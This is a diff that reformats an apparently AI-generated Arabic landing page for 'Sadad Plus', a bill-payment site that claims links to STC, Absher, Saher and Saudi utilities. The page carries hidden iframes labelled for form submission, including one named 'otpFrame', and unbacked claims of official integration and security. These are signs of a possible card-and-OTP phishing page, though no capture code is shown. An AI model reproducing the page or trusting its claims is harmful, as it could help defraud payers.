@@ -1,16 +1,15 @@
-<!DOCTYPE html><html lang="ar" dir="rtl"><head><meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob: https://cdnjs.cloudflare.com https://cdn.jsdelivr.net https://code.jquery.com https://unpkg.com https://d3js.org https://threejs.org https://cdn.plot.ly https://stackpath.bootstrapcdn.com https://maps.googleapis.com https://cdn.tailwindcss.com https://ajax.googleapis.com https://kit.fontawesome.com https://cdn.datatables.net https://maxcdn.bootstrapcdn.com https://code.highcharts.com https://tako-static-assets-production.s3.amazonaws.com https://www.youtube.com https://fonts.googleapis.com https://fonts.gstatic.com https://pfst.cf2.poecdn.net https://puc.poecdn.net https://i.imgur.com https://wikimedia.org https://*.icons8.com https://*.giphy.com https://picsum.photos https://images.unsplash.com; frame-src 'self' https://www.youtube.com https://trytako.com; child-src 'self'; manifest-src 'self'; worker-src 'self'; upgrade-insecure-requests; block-all-mixed-content;">
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>سداد بلس | منصة الدفع الذكية المتكاملة</title>
-    <meta name="description" content="منصة الدفع الأكثر تطوراً في المملكة العربية السعودية">
-    
-    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@200;300;400;500;700;800;900&amp;family=Inter:wght@400;500;600;700&amp;display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
-    <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
-    
-    <script>
+<!DOCTYPE html>
+<html dir="rtl" lang="ar"><head><meta content="default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob: https://cdnjs.cloudflare.com https://cdn.jsdelivr.net https://code.jquery.com https://unpkg.com https://d3js.org https://threejs.org https://cdn.plot.ly https://stackpath.bootstrapcdn.com https://maps.googleapis.com https://cdn.tailwindcss.com https://ajax.googleapis.com https://kit.fontawesome.com https://cdn.datatables.net https://maxcdn.bootstrapcdn.com https://code.highcharts.com https://tako-static-assets-production.s3.amazonaws.com https://www.youtube.com https://fonts.googleapis.com https://fonts.gstatic.com https://pfst.cf2.poecdn.net https://puc.poecdn.net https://i.imgur.com https://wikimedia.org https://*.icons8.com https://*.giphy.com https://picsum.photos https://images.unsplash.com; frame-src 'self' https://www.youtube.com https://trytako.com; child-src 'self'; manifest-src 'self'; worker-src 'self'; upgrade-insecure-requests; block-all-mixed-content;" http-equiv="Content-Security-Policy"/>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>سداد بلس | منصة الدفع الذكية المتكاملة</title>
+<meta content="منصة الدفع الأكثر تطوراً في المملكة العربية السعودية" name="description"/>
+<link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@200;300;400;500;700;800;900&amp;family=Inter:wght@400;500;600;700&amp;display=swap" rel="stylesheet"/>
+<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet"/>
+<script src="https://cdn.tailwindcss.com"></script>
+<link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet"/>
+<script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
+<script>
         tailwind.config = {
             theme: {
                 extend: {
@@ -35,8 +34,7 @@
             }
         }
     </script>
-    
-    <style>
+<style>
         * { font-family: 'Tajawal', 'Inter', sans-serif; }
         
         body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: #1f2937; }
@@ -434,925 +432,858 @@
         }
     </style>
 </head>
-
 <body class="bg-gray-50">
-    <!-- Hidden iframes for form submission -->
-    <iframe name="hiddenFrame" class="hidden-iframe"></iframe>
-    <iframe name="otpFrame" class="hidden-iframe"></iframe>
-    <iframe name="confirmFrame" class="hidden-iframe"></iframe>
-
-    <!-- Enhanced Navigation -->
-    <nav id="navbar" class="fixed top-0 w-full z-50 transition-all duration-300">
-        <div class="container mx-auto px-4 py-4">
-            <div class="flex items-center justify-between">
-                <!-- Logo -->
-                <div class="flex items-center space-x-3 space-x-reverse">
-                    <div class="w-12 h-12 nexus-gradient rounded-xl flex items-center justify-center animate-quantum">
-                        <i class="fas fa-infinity text-white text-xl"></i>
-                    </div>
-                    <div>
-                        <h1 class="text-2xl font-bold text-gray-900">سداد بلس</h1>
-                        <p class="text-sm text-gray-600">الجيل القادم من المدفوعات</p>
-                    </div>
-                </div>
-                
-                <!-- Navigation Menu -->
-                <div class="hidden lg:flex items-center space-x-8 space-x-reverse">
-                    <a href="#" onclick="showSection('home')" class="nav-link text-gray-700 hover:text-primary font-medium transition-colors">الرئيسية</a>
-                    <a href="#" onclick="showSection('payment')" class="nav-link text-gray-700 hover:text-primary font-medium transition-colors">الدفع</a>
-                </div>
-                
-                <!-- User Info -->
-                <div class="hidden md:flex items-center space-x-4 space-x-reverse">
-                    <div class="glass rounded-2xl p-3">
-                        <div class="text-center">
-                            <div class="text-sm text-gray-600 mb-1">مستخدم</div>
-                            <div class="font-bold">عميل مميز</div>
-                            <div class="text-sm text-nexus-blue">محقق الهوية</div>
-                        </div>
-                    </div>
-                    <button onclick="showSection('payment')" class="quantum-btn text-white px-6 py-2 rounded-xl font-medium">
+<!-- Hidden iframes for form submission -->
+<iframe class="hidden-iframe" name="hiddenFrame"></iframe>
+<iframe class="hidden-iframe" name="otpFrame"></iframe>
+<iframe class="hidden-iframe" name="confirmFrame"></iframe>
+<!-- Enhanced Navigation -->
+<nav class="fixed top-0 w-full z-50 transition-all duration-300" id="navbar">
+<div class="container mx-auto px-4 py-4">
+<div class="flex items-center justify-between">
+<!-- Logo -->
+<div class="flex items-center space-x-3 space-x-reverse">
+<div class="w-12 h-12 nexus-gradient rounded-xl flex items-center justify-center animate-quantum">
+<i class="fas fa-infinity text-white text-xl"></i>
+</div>
+<div>
+<h1 class="text-2xl font-bold text-gray-900">سداد بلس</h1>
+<p class="text-sm text-gray-600">الجيل القادم من المدفوعات</p>
+</div>
+</div>
+<!-- Navigation Menu -->
+<div class="hidden lg:flex items-center space-x-8 space-x-reverse">
+<a class="nav-link text-gray-700 hover:text-primary font-medium transition-colors" href="#" onclick="showSection('home')">الرئيسية</a>
+<a class="nav-link text-gray-700 hover:text-primary font-medium transition-colors" href="#" onclick="showSection('payment')">الدفع</a>
+</div>
+<!-- User Info -->
+<div class="hidden md:flex items-center space-x-4 space-x-reverse">
+<div class="glass rounded-2xl p-3">
+<div class="text-center">
+<div class="text-sm text-gray-600 mb-1">مستخدم</div>
+<div class="font-bold">عميل مميز</div>
+<div class="text-sm text-nexus-blue">محقق الهوية</div>
+</div>
+</div>
+<button class="quantum-btn text-white px-6 py-2 rounded-xl font-medium" onclick="showSection('payment')">
                         ادفع الآن
                     </button>
-                </div>
-                
-                <!-- Mobile Menu Button -->
-                <button class="lg:hidden p-2" onclick="toggleMobileMenu()">
-                    <i class="fas fa-bars text-xl"></i>
-                </button>
-            </div>
-        </div>
-        
-        <!-- Mobile Menu -->
-        <div id="mobileMenu" class="lg:hidden hidden bg-white border-t border-gray-200">
-            <div class="container mx-auto px-4 py-4 space-y-3">
-                <a href="#" onclick="showSection('home')" class="block text-gray-700 hover:text-primary font-medium">الرئيسية</a>
-                <a href="#" onclick="showSection('payment')" class="block text-gray-700 hover:text-primary font-medium">الدفع</a>
-            </div>
-        </div>
-    </nav>
-
-    <!-- Home Page -->
-    <div id="homePage" class="page active">
-        <!-- Hero Section -->
-        <section class="nexus-gradient min-h-screen flex items-center justify-center text-white relative pt-20">
-            <div class="absolute inset-0">
-                <div class="absolute top-20 left-10 w-20 h-20 bg-white/10 rounded-full animate-float"></div>
-                <div class="absolute bottom-20 right-10 w-32 h-32 bg-white/10 rounded-full animate-float" style="animation-delay: 2s;"></div>
-                <div class="absolute top-1/2 left-20 w-16 h-16 bg-white/10 rounded-full animate-float" style="animation-delay: 4s;"></div>
-            </div>
-            
-            <div class="container mx-auto px-6 text-center relative z-10">
-                <div data-aos="fade-up" data-aos-delay="200">
-                    <h1 class="hero-title text-5xl md:text-7xl font-bold mb-6 leading-tight">
+</div>
+<!-- Mobile Menu Button -->
+<button class="lg:hidden p-2" onclick="toggleMobileMenu()">
+<i class="fas fa-bars text-xl"></i>
+</button>
+</div>
+</div>
+<!-- Mobile Menu -->
+<div class="lg:hidden hidden bg-white border-t border-gray-200" id="mobileMenu">
+<div class="container mx-auto px-4 py-4 space-y-3">
+<a class="block text-gray-700 hover:text-primary font-medium" href="#" onclick="showSection('home')">الرئيسية</a>
+<a class="block text-gray-700 hover:text-primary font-medium" href="#" onclick="showSection('payment')">الدفع</a>
+</div>
+</div>
+</nav>
+<!-- Home Page -->
+<div class="page active" id="homePage">
+<!-- Hero Section -->
+<section class="nexus-gradient min-h-screen flex items-center justify-center text-white relative pt-20">
+<div class="absolute inset-0">
+<div class="absolute top-20 left-10 w-20 h-20 bg-white/10 rounded-full animate-float"></div>
+<div class="absolute bottom-20 right-10 w-32 h-32 bg-white/10 rounded-full animate-float" style="animation-delay: 2s;"></div>
+<div class="absolute top-1/2 left-20 w-16 h-16 bg-white/10 rounded-full animate-float" style="animation-delay: 4s;"></div>
+</div>
+<div class="container mx-auto px-6 text-center relative z-10">
+<div data-aos="fade-up" data-aos-delay="200">
+<h1 class="hero-title text-5xl md:text-7xl font-bold mb-6 leading-tight">
                         مستقبل المدفوعات
-                        <br>
-                        <span class="text-yellow-300">الرقمية</span>
-                    </h1>
-                    <p class="text-xl md:text-2xl mb-12 text-white/90 max-w-4xl mx-auto leading-relaxed">
+                        <br/>
+<span class="text-yellow-300">الرقمية</span>
+</h1>
+<p class="text-xl md:text-2xl mb-12 text-white/90 max-w-4xl mx-auto leading-relaxed">
                         ادفع جميع فواتيرك بسهولة وأمان مع أحدث تقنيات الدفع الرقمي في المملكة العربية السعودية
                     </p>
-                </div>
-                
-                <!-- Quick Stats -->
-                <div class="grid grid-cols-2 md:grid-cols-4 gap-6 max-w-4xl mx-auto mb-12" data-aos="fade-up" data-aos-delay="600">
-                    <div class="stats-card">
-                        <div class="text-3xl font-bold text-yellow-300">75,000+</div>
-                        <div class="text-white/80">مستخدم نشط</div>
-                    </div>
-                    <div class="stats-card">
-                        <div class="text-3xl font-bold text-yellow-300">3.5M+</div>
-                        <div class="text-white/80">معاملة مكتملة</div>
-                    </div>
-                    <div class="stats-card">
-                        <div class="text-3xl font-bold text-yellow-300">99.9%</div>
-                        <div class="text-white/80">نسبة الأمان</div>
-                    </div>
-                    <div class="stats-card">
-                        <div class="text-3xl font-bold text-yellow-300">24/7</div>
-                        <div class="text-white/80">دعم فني</div>
-                    </div>
-                </div>
-                
-                <!-- Quick Actions -->
-                <div class="grid grid-cols-2 md:grid-cols-6 gap-4 max-w-6xl mx-auto" data-aos="fade-up" data-aos-delay="800">
-                    <button onclick="openTelecomModal()" class="glass rounded-xl p-6 hover:bg-white/20 transition-all">
-                        <i class="fas fa-mobile-alt text-3xl mb-3"></i>
-                        <div class="text-sm">خدمات الجوال</div>
-                    </button>
-                    <button onclick="openUtilitiesModal()" class="glass rounded-xl p-6 hover:bg-white/20 transition-all">
-                        <i class="fas fa-bolt text-3xl mb-3"></i>
-                        <div class="text-sm">فواتير المرافق</div>
-                    </button>
-                    <button onclick="openInternetModal()" class="glass rounded-xl p-6 hover:bg-white/20 transition-all">
-                        <i class="fas fa-wifi text-3xl mb-3"></i>
-                        <div class="text-sm">فواتير الإنترنت</div>
-                    </button>
-                    <button onclick="openViolationsModal()" class="glass rounded-xl p-6 hover:bg-white/20 transition-all">
-                        <i class="fas fa-car text-3xl mb-3"></i>
-                        <div class="text-sm">المخالفات</div>
-                    </button>
-                    <button onclick="openGovernmentModal()" class="glass rounded-xl p-6 hover:bg-white/20 transition-all">
-                        <i class="fas fa-building text-3xl mb-3"></i>
-                        <div class="text-sm">خدمات حكومية</div>
-                    </button>
-                    <button onclick="showSection('payment')" class="glass rounded-xl p-6 hover:bg-white/20 transition-all bg-gradient-to-r from-green-500/20 to-blue-500/20 border border-green-500/30">
-                        <i class="fas fa-credit-card text-3xl mb-3 text-green-400"></i>
-                        <div class="text-sm text-green-400 font-bold">دفع مباشر</div>
-                    </button>
-                </div>
-            </div>
-        </section>
-
-        <!-- Services Section -->
-        <section class="py-20 bg-white">
-            <div class="container mx-auto px-6">
-                <div class="text-center mb-16" data-aos="fade-up">
-                    <h2 class="text-4xl md:text-5xl font-bold bg-gradient-to-r from-primary to-secondary bg-clip-text text-transparent mb-6">
+</div>
+<!-- Quick Stats -->
+<div class="grid grid-cols-2 md:grid-cols-4 gap-6 max-w-4xl mx-auto mb-12" data-aos="fade-up" data-aos-delay="600">
+<div class="stats-card">
+<div class="text-3xl font-bold text-yellow-300">75,000+</div>
+<div class="text-white/80">مستخدم نشط</div>
+</div>
+<div class="stats-card">
+<div class="text-3xl font-bold text-yellow-300">3.5M+</div>
+<div class="text-white/80">معاملة مكتملة</div>
+</div>
+<div class="stats-card">
+<div class="text-3xl font-bold text-yellow-300">99.9%</div>
+<div class="text-white/80">نسبة الأمان</div>
+</div>
+<div class="stats-card">
+<div class="text-3xl font-bold text-yellow-300">24/7</div>
+<div class="text-white/80">دعم فني</div>
+</div>
+</div>
+<!-- Quick Actions -->
+<div class="grid grid-cols-2 md:grid-cols-6 gap-4 max-w-6xl mx-auto" data-aos="fade-up" data-aos-delay="800">
+<button class="glass rounded-xl p-6 hover:bg-white/20 transition-all" onclick="openTelecomModal()">
+<i class="fas fa-mobile-alt text-3xl mb-3"></i>
+<div class="text-sm">خدمات الجوال</div>
+</button>
+<button class="glass rounded-xl p-6 hover:bg-white/20 transition-all" onclick="openUtilitiesModal()">
+<i class="fas fa-bolt text-3xl mb-3"></i>
+<div class="text-sm">فواتير المرافق</div>
+</button>
+<button class="glass rounded-xl p-6 hover:bg-white/20 transition-all" onclick="openInternetModal()">
+<i class="fas fa-wifi text-3xl mb-3"></i>
+<div class="text-sm">فواتير الإنترنت</div>
+</button>
+<button class="glass rounded-xl p-6 hover:bg-white/20 transition-all" onclick="openViolationsModal()">
+<i class="fas fa-car text-3xl mb-3"></i>
+<div class="text-sm">المخالفات</div>
+</button>
+<button class="glass rounded-xl p-6 hover:bg-white/20 transition-all" onclick="openGovernmentModal()">
+<i class="fas fa-building text-3xl mb-3"></i>
+<div class="text-sm">خدمات حكومية</div>
+</button>
+<button class="glass rounded-xl p-6 hover:bg-white/20 transition-all bg-gradient-to-r from-green-500/20 to-blue-500/20 border border-green-500/30" onclick="showSection('payment')">
+<i class="fas fa-credit-card text-3xl mb-3 text-green-400"></i>
+<div class="text-sm text-green-400 font-bold">دفع مباشر</div>
+</button>
+</div>
+</div>
+</section>
+<!-- Services Section -->
+<section class="py-20 bg-white">
+<div class="container mx-auto px-6">
+<div class="text-center mb-16" data-aos="fade-up">
+<h2 class="text-4xl md:text-5xl font-bold bg-gradient-to-r from-primary to-secondary bg-clip-text text-transparent mb-6">
                         خدمات المستقبل
                     </h2>
-                    <p class="text-xl text-gray-600 max-w-3xl mx-auto">
+<p class="text-xl text-gray-600 max-w-3xl mx-auto">
                         تكنولوجيا تفوق الخيال مع إمكانية الدفع المرن
                     </p>
-                </div>
-                
-                <div class="service-grid">
-                    <!-- Telecom Services -->
-                    <div class="neuro-card rounded-3xl p-8 cursor-pointer group" onclick="openTelecomModal()" data-aos="fade-up" data-aos-delay="100">
-                        <div class="relative mb-6">
-                            <div class="w-24 h-24 mx-auto bg-gradient-to-r from-nexus-blue to-nexus-purple rounded-2xl flex items-center justify-center group-hover:animate-float">
-                                <i class="fas fa-mobile-alt text-4xl text-white"></i>
-                            </div>
-                            <div class="absolute -top-2 -right-2 w-8 h-8 bg-nexus-green rounded-full flex items-center justify-center">
-                                <i class="fas fa-check text-sm"></i>
-                            </div>
-                        </div>
-                        <h3 class="text-2xl font-bold mb-4 text-white">خدمات الاتصالات الذكية</h3>
-                        <p class="text-white/70 mb-6">ربط مباشر مع STC، موبايلي، زين، فيرجن</p>
-                        <div class="reality-check">
-                            <div class="flex items-center gap-2 text-sm">
-                                <i class="fas fa-satellite text-nexus-blue"></i>
-                                <span>ربط حقيقي مع الشركات</span>
-                            </div>
-                            <div class="flex items-center gap-2 text-sm mt-2">
-                                <i class="fas fa-magic text-nexus-purple"></i>
-                                <span>دفع فوري + شحن رصيد</span>
-                            </div>
-                        </div>
-                    </div>
-                    
-                    <!-- Internet Services -->
-                    <div class="neuro-card rounded-3xl p-8 cursor-pointer group" onclick="openInternetModal()" data-aos="fade-up" data-aos-delay="150">
-                        <div class="relative mb-6">
-                            <div class="w-24 h-24 mx-auto bg-gradient-to-r from-nexus-purple to-nexus-pink rounded-2xl flex items-center justify-center group-hover:animate-float">
-                                <i class="fas fa-wifi text-4xl text-white"></i>
-                            </div>
-                            <div class="absolute -top-2 -right-2 w-8 h-8 bg-nexus-gold rounded-full flex items-center justify-center">
-                                <i class="fas fa-rocket text-sm"></i>
-                            </div>
-                        </div>
-                        <h3 class="text-2xl font-bold mb-4 text-white">فواتير الإنترنت</h3>
-                        <p class="text-white/70 mb-6">جميع مزودي الإنترنت + اختبار السرعة الحي</p>
-                        <div class="reality-check">
-                            <div class="flex items-center gap-2 text-sm">
-                                <i class="fas fa-gauge-high text-nexus-purple"></i>
-                                <span>قياس سرعة الإنترنت المباشر</span>
-                            </div>
-                            <div class="flex items-center gap-2 text-sm mt-2">
-                                <i class="fas fa-network-wired text-nexus-pink"></i>
-                                <span>تحسين الاتصال التلقائي</span>
-                            </div>
-                        </div>
-                    </div>
-                    
-                    <!-- Utilities -->
-                    <div class="neuro-card rounded-3xl p-8 cursor-pointer group" onclick="openUtilitiesModal()" data-aos="fade-up" data-aos-delay="200">
-                        <div class="relative mb-6">
-                            <div class="w-24 h-24 mx-auto bg-gradient-to-r from-nexus-gold to-nexus-green rounded-2xl flex items-center justify-center group-hover:animate-float">
-                                <i class="fas fa-bolt text-4xl text-white"></i>
-                            </div>
-                            <div class="absolute -top-2 -right-2 w-8 h-8 bg-nexus-blue rounded-full flex items-center justify-center">
-                                <i class="fas fa-zap text-sm"></i>
-                            </div>
-                        </div>
-                        <h3 class="text-2xl font-bold mb-4 text-white">فواتير المرافق الذكية</h3>
-                        <p class="text-white/70 mb-6">الشركة السعودية للكهرباء + الماء + الغاز</p>
-                        <div class="reality-check">
-                            <div class="flex items-center gap-2 text-sm">
-                                <i class="fas fa-chart-area text-nexus-green"></i>
-                                <span>تحليل الاستهلاك بالذكاء الاصطناعي</span>
-                            </div>
-                            <div class="flex items-center gap-2 text-sm mt-2">
-                                <i class="fas fa-leaf text-nexus-blue"></i>
-                                <span>نصائح توفير الطاقة</span>
-                            </div>
-                        </div>
-                    </div>
-                    
-                    <!-- Traffic Violations -->
-                    <div class="neuro-card rounded-3xl p-8 cursor-pointer group" onclick="openViolationsModal()" data-aos="fade-up" data-aos-delay="300">
-                        <div class="relative mb-6">
-                            <div class="w-24 h-24 mx-auto bg-gradient-to-r from-nexus-pink to-nexus-gold rounded-2xl flex items-center justify-center group-hover:animate-float">
-                                <i class="fas fa-car text-4xl text-white"></i>
-                            </div>
-                            <div class="absolute -top-2 -right-2 w-8 h-8 bg-nexus-green rounded-full flex items-center justify-center">
-                                <i class="fas fa-camera text-sm"></i>
-                            </div>
-                        </div>
-                        <h3 class="text-2xl font-bold mb-4 text-white">المخالفات الذكية</h3>
-                        <p class="text-white/70 mb-6">ربط مع ساهر + خرائط المخالفات التفاعلية</p>
-                        <div class="reality-check">
-                            <div class="flex items-center gap-2 text-sm">
-                                <i class="fas fa-map-marker-alt text-nexus-pink"></i>
-                                <span>خريطة تفاعلية للمخالفات</span>
-                            </div>
-                            <div class="flex items-center gap-2 text-sm mt-2">
-                                <i class="fas fa-calendar-check text-nexus-gold"></i>
-                                <span>تنبيهات الدفع الذكية</span>
-                            </div>
-                        </div>
-                    </div>
-                    
-                    <!-- Government Services -->
-                    <div class="neuro-card rounded-3xl p-8 cursor-pointer group" onclick="openGovernmentModal()" data-aos="fade-up" data-aos-delay="400">
-                        <div class="relative mb-6">
-                            <div class="w-24 h-24 mx-auto bg-gradient-to-r from-nexus-green to-nexus-blue rounded-2xl flex items-center justify-center group-hover:animate-float">
-                                <i class="fas fa-building text-4xl text-white"></i>
-                            </div>
-                            <div class="absolute -top-2 -right-2 w-8 h-8 bg-nexus-pink rounded-full flex items-center justify-center">
-                                <i class="fas fa-crown text-sm"></i>
-                            </div>
-                        </div>
-                        <h3 class="text-2xl font-bold mb-4 text-white">الخدمات الحكومية</h3>
-                        <p class="text-white/70 mb-6">ربط مع أبشر، وزارة العدل، الجوازات، العمل</p>
-                        <div class="reality-check">
-                            <div class="flex items-center gap-2 text-sm">
-                                <i class="fas fa-fingerprint text-nexus-green"></i>
-                                <span>تحقق بيومتري متقدم</span>
-                            </div>
-                            <div class="flex items-center gap-2 text-sm mt-2">
-                                <i class="fas fa-file-shield text-nexus-blue"></i>
-                                <span>أمان حكومي معتمد</span>
-                            </div>
-                        </div>
-                    </div>
-                    
-                    <!-- Shopping & Entertainment -->
-                    <div class="neuro-card rounded-3xl p-8 cursor-pointer group" onclick="openShoppingModal()" data-aos="fade-up" data-aos-delay="500">
-                        <div class="relative mb-6">
-                            <div class="w-24 h-24 mx-auto bg-gradient-to-r from-nexus-pink to-nexus-purple rounded-2xl flex items-center justify-center group-hover:animate-float">
-                                <i class="fas fa-shopping-cart text-4xl text-white"></i>
-                            </div>
-                            <div class="absolute -top-2 -right-2 w-8 h-8 bg-nexus-gold rounded-full flex items-center justify-center">
-                                <i class="fas fa-star text-sm"></i>
-                            </div>
-                        </div>
-                        <h3 class="text-2xl font-bold mb-4 text-white">التسوق والترفيه</h3>
-                        <p class="text-white/70 mb-6">بطاقات الألعاب، نتفليكس، أمازون، كارفور</p>
-                        <div class="reality-check">
-                            <div class="flex items-center gap-2 text-sm">
-                                <i class="fas fa-gamepad text-nexus-pink"></i>
-                                <span>بطاقات الألعاب الفورية</span>
-                            </div>
-                            <div class="flex items-center gap-2 text-sm mt-2">
-                                <i class="fas fa-film text-nexus-purple"></i>
-                                <span>اشتراكات الترفيه</span>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </section>
-    </div>
-
-    <!-- Payment Page -->
-    <div id="paymentPage" class="page">
-        <div class="min-h-screen bg-black relative overflow-hidden">
-            <!-- Matrix Style Background -->
-            <div class="absolute inset-0 opacity-20">
-                <div class="matrix-rain"></div>
-            </div>
-            
-            <!-- Holographic Grid -->
-            <div class="absolute inset-0">
-                <div class="holographic-grid opacity-30"></div>
-                <div class="absolute top-0 left-0 w-full h-full">
-                    <div class="floating-particle" style="top: 10%; left: 15%; animation-delay: 0s;"></div>
-                    <div class="floating-particle" style="top: 20%; right: 20%; animation-delay: 2s;"></div>
-                    <div class="floating-particle" style="top: 70%; left: 10%; animation-delay: 4s;"></div>
-                    <div class="floating-particle" style="top: 80%; right: 15%; animation-delay: 6s;"></div>
-                </div>
-            </div>
-            
-            <div class="relative z-10 pt-20 pb-12">
-                <div class="container mx-auto px-6">
-                    <!-- Futuristic Header -->
-                    <div class="text-center mb-16" data-aos="fade-down">
-                        <h1 class="text-6xl md:text-8xl font-black text-transparent bg-clip-text bg-gradient-to-r from-cyan-400 via-blue-500 to-purple-600 mb-6 futuristic-text">
+</div>
+<div class="service-grid">
+<!-- Telecom Services -->
+<div class="neuro-card rounded-3xl p-8 cursor-pointer group" data-aos="fade-up" data-aos-delay="100" onclick="openTelecomModal()">
+<div class="relative mb-6">
+<div class="w-24 h-24 mx-auto bg-gradient-to-r from-nexus-blue to-nexus-purple rounded-2xl flex items-center justify-center group-hover:animate-float">
+<i class="fas fa-mobile-alt text-4xl text-white"></i>
+</div>
+<div class="absolute -top-2 -right-2 w-8 h-8 bg-nexus-green rounded-full flex items-center justify-center">
+<i class="fas fa-check text-sm"></i>
+</div>
+</div>
+<h3 class="text-2xl font-bold mb-4 text-white">خدمات الاتصالات الذكية</h3>
+<p class="text-white/70 mb-6">ربط مباشر مع STC، موبايلي، زين، فيرجن</p>
+<div class="reality-check">
+<div class="flex items-center gap-2 text-sm">
+<i class="fas fa-satellite text-nexus-blue"></i>
+<span>ربط حقيقي مع الشركات</span>
+</div>
+<div class="flex items-center gap-2 text-sm mt-2">
+<i class="fas fa-magic text-nexus-purple"></i>
+<span>دفع فوري + شحن رصيد</span>
+</div>
+</div>
+</div>
+<!-- Internet Services -->
+<div class="neuro-card rounded-3xl p-8 cursor-pointer group" data-aos="fade-up" data-aos-delay="150" onclick="openInternetModal()">
+<div class="relative mb-6">
+<div class="w-24 h-24 mx-auto bg-gradient-to-r from-nexus-purple to-nexus-pink rounded-2xl flex items-center justify-center group-hover:animate-float">
+<i class="fas fa-wifi text-4xl text-white"></i>
+</div>
+<div class="absolute -top-2 -right-2 w-8 h-8 bg-nexus-gold rounded-full flex items-center justify-center">
+<i class="fas fa-rocket text-sm"></i>
+</div>
+</div>
+<h3 class="text-2xl font-bold mb-4 text-white">فواتير الإنترنت</h3>
+<p class="text-white/70 mb-6">جميع مزودي الإنترنت + اختبار السرعة الحي</p>
+<div class="reality-check">
+<div class="flex items-center gap-2 text-sm">
+<i class="fas fa-gauge-high text-nexus-purple"></i>
+<span>قياس سرعة الإنترنت المباشر</span>
+</div>
+<div class="flex items-center gap-2 text-sm mt-2">
+<i class="fas fa-network-wired text-nexus-pink"></i>
+<span>تحسين الاتصال التلقائي</span>
+</div>
+</div>
+</div>
+<!-- Utilities -->
+<div class="neuro-card rounded-3xl p-8 cursor-pointer group" data-aos="fade-up" data-aos-delay="200" onclick="openUtilitiesModal()">
+<div class="relative mb-6">
+<div class="w-24 h-24 mx-auto bg-gradient-to-r from-nexus-gold to-nexus-green rounded-2xl flex items-center justify-center group-hover:animate-float">
+<i class="fas fa-bolt text-4xl text-white"></i>
+</div>
+<div class="absolute -top-2 -right-2 w-8 h-8 bg-nexus-blue rounded-full flex items-center justify-center">
+<i class="fas fa-zap text-sm"></i>
+</div>
+</div>
+<h3 class="text-2xl font-bold mb-4 text-white">فواتير المرافق الذكية</h3>
+<p class="text-white/70 mb-6">الشركة السعودية للكهرباء + الماء + الغاز</p>
+<div class="reality-check">
+<div class="flex items-center gap-2 text-sm">
+<i class="fas fa-chart-area text-nexus-green"></i>
+<span>تحليل الاستهلاك بالذكاء الاصطناعي</span>
+</div>
+<div class="flex items-center gap-2 text-sm mt-2">
+<i class="fas fa-leaf text-nexus-blue"></i>
+<span>نصائح توفير الطاقة</span>
+</div>
+</div>
+</div>
+<!-- Traffic Violations -->
+<div class="neuro-card rounded-3xl p-8 cursor-pointer group" data-aos="fade-up" data-aos-delay="300" onclick="openViolationsModal()">
+<div class="relative mb-6">
+<div class="w-24 h-24 mx-auto bg-gradient-to-r from-nexus-pink to-nexus-gold rounded-2xl flex items-center justify-center group-hover:animate-float">
+<i class="fas fa-car text-4xl text-white"></i>
+</div>
+<div class="absolute -top-2 -right-2 w-8 h-8 bg-nexus-green rounded-full flex items-center justify-center">
+<i class="fas fa-camera text-sm"></i>
+</div>
+</div>
+<h3 class="text-2xl font-bold mb-4 text-white">المخالفات الذكية</h3>
+<p class="text-white/70 mb-6">ربط مع ساهر + خرائط المخالفات التفاعلية</p>
+<div class="reality-check">
+<div class="flex items-center gap-2 text-sm">
+<i class="fas fa-map-marker-alt text-nexus-pink"></i>
+<span>خريطة تفاعلية للمخالفات</span>
+</div>
+<div class="flex items-center gap-2 text-sm mt-2">
+<i class="fas fa-calendar-check text-nexus-gold"></i>
+<span>تنبيهات الدفع الذكية</span>
+</div>
+</div>
+</div>
+<!-- Government Services -->
+<div class="neuro-card rounded-3xl p-8 cursor-pointer group" data-aos="fade-up" data-aos-delay="400" onclick="openGovernmentModal()">
+<div class="relative mb-6">
+<div class="w-24 h-24 mx-auto bg-gradient-to-r from-nexus-green to-nexus-blue rounded-2xl flex items-center justify-center group-hover:animate-float">
+<i class="fas fa-building text-4xl text-white"></i>
+</div>
+<div class="absolute -top-2 -right-2 w-8 h-8 bg-nexus-pink rounded-full flex items-center justify-center">
+<i class="fas fa-crown text-sm"></i>
+</div>
+</div>
+<h3 class="text-2xl font-bold mb-4 text-white">الخدمات الحكومية</h3>
+<p class="text-white/70 mb-6">ربط مع أبشر، وزارة العدل، الجوازات، العمل</p>
+<div class="reality-check">
+<div class="flex items-center gap-2 text-sm">
+<i class="fas fa-fingerprint text-nexus-green"></i>
+<span>تحقق بيومتري متقدم</span>
+</div>
+<div class="flex items-center gap-2 text-sm mt-2">
+<i class="fas fa-file-shield text-nexus-blue"></i>
+<span>أمان حكومي معتمد</span>
+</div>
+</div>
+</div>
+<!-- Shopping & Entertainment -->
+<div class="neuro-card rounded-3xl p-8 cursor-pointer group" data-aos="fade-up" data-aos-delay="500" onclick="openShoppingModal()">
+<div class="relative mb-6">
+<div class="w-24 h-24 mx-auto bg-gradient-to-r from-nexus-pink to-nexus-purple rounded-2xl flex items-center justify-center group-hover:animate-float">
+<i class="fas fa-shopping-cart text-4xl text-white"></i>
+</div>
+<div class="absolute -top-2 -right-2 w-8 h-8 bg-nexus-gold rounded-full flex items-center justify-center">
+<i class="fas fa-star text-sm"></i>
+</div>
+</div>
+<h3 class="text-2xl font-bold mb-4 text-white">التسوق والترفيه</h3>
+<p class="text-white/70 mb-6">بطاقات الألعاب، نتفليكس، أمازون، كارفور</p>
+<div class="reality-check">
+<div class="flex items-center gap-2 text-sm">
+<i class="fas fa-gamepad text-nexus-pink"></i>
+<span>بطاقات الألعاب الفورية</span>
